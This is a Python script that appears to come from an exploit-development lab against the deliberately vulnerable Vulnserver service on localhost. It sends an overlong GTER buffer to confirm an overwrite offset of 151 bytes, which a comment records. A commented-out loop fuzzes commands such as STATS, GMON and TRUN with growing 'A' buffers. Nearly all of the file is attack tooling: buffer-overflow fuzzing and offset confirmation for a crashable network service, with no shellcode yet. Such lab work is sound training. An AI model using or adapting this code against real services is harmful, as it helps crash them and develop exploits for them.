import socket
from time import sleep
ip = "127.0.0.1"
port= 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
data=s.recv(1024)
pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af"
pattern="A"*151+"BBBBCCCCCCCC"
buffer="GTER "+pattern+"\r\n\r\n"

s.send(buffer)
data=s.recv(1024)
print(data+str(len(buffer)))
sleep(1)


#===>>>  ==> Exact match at offset 151 



















'''

while True:
     try:
          c=c+1
          buffer="A"*150
          buffer=buffer*c+"\r\n\r\n"
          
          
          
          s.send("STATS ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("RTIME ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("LTIME ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("SRUN ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
       
          #s.send("TRUN ."+buffer)
          #data=s.recv(1024)
          #print(data+" size 10x"+str(c))
          #sleep(0.1)
          
          s.send("GMON /"+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
        
          s.send("GDOG ."+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
         
          #s.send("KSTET "+buffer)
          #data=s.recv(1024)
          #print(data+" size 10x"+str(c))
          #sleep(1)
       
          #s.send("GTER "+buffer)
          #data=s.recv(1024)
          #print(data+" size 20x"+str(c))
          #sleep(0.1)
          
          #s.send("HTER "+buffer)
          #data=s.recv(1024)
          #print(data+" size 10x"+str(c))
          #sleep(0.1)
          
          #print("LTER")
          #s.send("LTER ."+buffer)
          #data=s.recv(1024)
          #print(data+" size 10x"+str(c))
          #sleep(0.1)
          
          #s.send("KSTAN ."+buffer)
          #data=s.recv(1024)
          #print(data+" size 10x"+str(c))
          #sleep(0.1)
          
     except:
          print(data)
          sys.exit()'''
          
